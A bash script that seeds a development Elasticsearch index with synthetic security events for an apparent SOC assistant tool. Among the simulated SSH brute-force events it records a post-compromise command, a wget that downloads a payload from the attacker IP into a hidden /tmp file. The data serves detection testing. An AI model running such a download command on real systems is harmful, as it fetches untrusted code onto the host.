#!/usr/bin/env bash
# Seed a local dev Elasticsearch with raw event telemetry for the
# soc-copilot `search_internal_logs` tool to query.
#
# Reputation feeds answer "is this indicator known-bad"; only the
# environment's own logs answer "did the thing happen HERE". This index
# gives the agentic loop that ground truth. The centerpiece is the
# brute-force scenario for 185.220.101.47 (the local brute_force_ssh.json
# fixture's source IP): a burst of failed SSH logins to prod-web-02,
# followed by ONE successful login from the same IP — the smoking gun a
# human would pivot to find, and now the copilot can too. A search for
# `source.ip=185.220.101.47 AND event.outcome=success` returns it.
#
# Fields are mapped as keyword/ip so the tool's exact `term` filters match.
#
# Usage:
#   ES_PASS=<elastic password> ./scripts/elastic_dev_events_seed.sh
#   ES_URL / ES_USER / EVENTS_INDEX override the defaults below.
set -euo pipefail

ES_URL="${ES_URL:-http://127.0.0.1:9200}"
ES_USER="${ES_USER:-elastic}"
ES_PASS="${ES_PASS:?set ES_PASS to the elastic superuser password}"
EVENTS_INDEX="${EVENTS_INDEX:-soc-events-demo}"

auth=(-u "$ES_USER:$ES_PASS")
# Minutes-ago timestamp so events fall inside the tool's default 24h window.
now() { date -u -d "$1 minutes ago" +"%Y-%m-%dT%H:%M:%SZ"; }

echo "Creating events index $EVENTS_INDEX (idempotent)..."
curl -sS "${auth[@]}" -X PUT "$ES_URL/$EVENTS_INDEX" \
  -H 'Content-Type: application/json' -d '{
  "mappings": {
    "properties": {
      "@timestamp": {"type": "date"},
      "message": {"type": "text"},
      "source":      {"properties": {"ip": {"type": "ip"}}},
      "destination": {"properties": {"ip": {"type": "ip"}, "port": {"type": "integer"}}},
      "user": {"properties": {"name": {"type": "keyword"}}},
      "host": {"properties": {"name": {"type": "keyword"}}},
      "event": {"properties": {
        "action":   {"type": "keyword"},
        "category": {"type": "keyword"},
        "outcome":  {"type": "keyword"},
        "type":     {"type": "keyword"}
      }},
      "process": {"properties": {"name": {"type": "keyword"}}},
      "network": {"properties": {"protocol": {"type": "keyword"}}},
      "dns":  {"properties": {"question": {"properties": {"name": {"type": "keyword"}}}}},
      "file": {"properties": {"hash": {"properties": {"sha256": {"type": "keyword"}}}}},
      "url":  {"properties": {"original": {"type": "keyword"}}}
    }
  }
}' >/dev/null || true

echo "Bulk-indexing event telemetry..."
curl -sS "${auth[@]}" -X POST "$ES_URL/_bulk?refresh=true" \
  -H 'Content-Type: application/x-ndjson' --data-binary @- <<EOF | python3 -c "import json,sys; d=json.load(sys.stdin); print(' errors:', d['errors'])"
{"index": {"_index": "$EVENTS_INDEX"}}
{"@timestamp": "$(now 47)", "source": {"ip": "185.220.101.47"}, "host": {"name": "prod-web-02.internal"}, "user": {"name": "root"}, "event": {"category": "authentication", "action": "ssh_login", "outcome": "failure", "type": "start"}, "message": "Failed password for root from 185.220.101.47 port 51344 ssh2"}
{"index": {"_index": "$EVENTS_INDEX"}}
{"@timestamp": "$(now 46)", "source": {"ip": "185.220.101.47"}, "host": {"name": "prod-web-02.internal"}, "user": {"name": "admin"}, "event": {"category": "authentication", "action": "ssh_login", "outcome": "failure", "type": "start"}, "message": "Failed password for admin from 185.220.101.47 port 51402 ssh2"}
{"index": {"_index": "$EVENTS_INDEX"}}
{"@timestamp": "$(now 46)", "source": {"ip": "185.220.101.47"}, "host": {"name": "prod-web-02.internal"}, "user": {"name": "ubuntu"}, "event": {"category": "authentication", "action": "ssh_login", "outcome": "failure", "type": "start"}, "message": "Failed password for ubuntu from 185.220.101.47 port 51455 ssh2"}
{"index": {"_index": "$EVENTS_INDEX"}}
{"@timestamp": "$(now 45)", "source": {"ip": "185.220.101.47"}, "host": {"name": "prod-web-02.internal"}, "user": {"name": "postgres"}, "event": {"category": "authentication", "action": "ssh_login", "outcome": "failure", "type": "start"}, "message": "Failed password for postgres from 185.220.101.47 port 51500 ssh2"}
{"index": {"_index": "$EVENTS_INDEX"}}
{"@timestamp": "$(now 44)", "source": {"ip": "185.220.101.47"}, "host": {"name": "prod-web-02.internal"}, "user": {"name": "root"}, "event": {"category": "authentication", "action": "ssh_login", "outcome": "success", "type": "start"}, "message": "Accepted password for root from 185.220.101.47 port 51603 ssh2"}
{"index": {"_index": "$EVENTS_INDEX"}}
{"@timestamp": "$(now 43)", "source": {"ip": "185.220.101.47"}, "destination": {"ip": "10.30.4.9", "port": 22}, "host": {"name": "prod-web-02.internal"}, "user": {"name": "root"}, "event": {"category": "process", "action": "process_start", "outcome": "success", "type": "start"}, "process": {"name": "wget"}, "message": "root ran: wget http://185.220.101.47/x -O /tmp/.s"}
{"index": {"_index": "$EVENTS_INDEX"}}
{"@timestamp": "$(now 30)", "source": {"ip": "203.0.113.9"}, "host": {"name": "app-04.internal"}, "user": {"name": "j.lee"}, "event": {"category": "authentication", "action": "ssh_login", "outcome": "success", "type": "start"}, "message": "Accepted publickey for j.lee from 203.0.113.9 port 4402 ssh2"}
{"index": {"_index": "$EVENTS_INDEX"}}
{"@timestamp": "$(now 12)", "source": {"ip": "10.20.8.15"}, "host": {"name": "app-db-14.internal"}, "user": {"name": "svc-qualys"}, "event": {"category": "authentication", "action": "ssh_login", "outcome": "failure", "type": "start"}, "message": "Failed password for svc-qualys from 10.20.8.15 (scanner) port 33001 ssh2"}
EOF

echo "Done. The smoking gun:"
echo "  curl -s ${auth[*]} '$ES_URL/$EVENTS_INDEX/_search' -H 'Content-Type: application/json' -d '{\"query\":{\"bool\":{\"filter\":[{\"term\":{\"source.ip\":\"185.220.101.47\"}},{\"term\":{\"event.outcome\":\"success\"}}]}}}'"
